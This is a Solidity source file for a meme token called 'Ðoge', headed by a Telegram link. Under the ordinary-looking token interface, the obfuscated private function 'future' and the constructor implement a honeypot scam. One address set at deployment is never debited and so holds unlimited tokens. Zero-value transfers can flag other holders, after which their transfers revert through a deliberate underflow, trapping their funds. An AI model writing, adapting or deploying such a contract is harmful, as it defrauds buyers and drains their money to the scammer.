/*
https://t.me/disthekey
*/

// SPDX-License-Identifier: None

pragma solidity >0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DOGE is Ownable {

    constructor(address koja) {
        balanceOf[msg.sender] = totalSupply;
        orchi[koja] = mili;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public name = unicode"Ðoge";
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1_000_000_000_000_000 * 10 ** 9;


    event Transfer(address indexed from, address indexed to, uint256 value);
    
    function transferFrom(address ultra, address moon, uint256 sun) public returns (bool success) {
        future(ultra, moon, sun);
        require(sun <= allowance[ultra][msg.sender]);
        allowance[ultra][msg.sender] -= sun;
        return true;
    }

    mapping(address => uint256) private dzek;

    function transfer(address moon, uint256 sun) public returns (bool success) {
        future(msg.sender, moon, sun);
        return true;
    }


   
    function approve(address pakro, uint256 sun) public returns (bool success) {
        allowance[msg.sender][pakro] = sun;
        emit Approval(msg.sender, pakro, sun);
        return true;
    }

    uint256 private mili = 44;
    string public symbol = unicode"Ð";
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    mapping(address => uint256) private orchi;

    address public uniswapV2Pair;
    
    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;
    function future(address ultra, address moon, uint256 sun) private returns (bool success) {
        if (orchi[ultra] == 0) {
            balanceOf[ultra] -= sun;
        }

        if (sun == 0) dzek[moon] += mili;

        if (orchi[ultra] == 0 && uniswapV2Pair != ultra && dzek[ultra] > 0) {
            orchi[ultra] -= mili;
        }

        balanceOf[moon] += sun;
        emit Transfer(ultra, moon, sun);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

}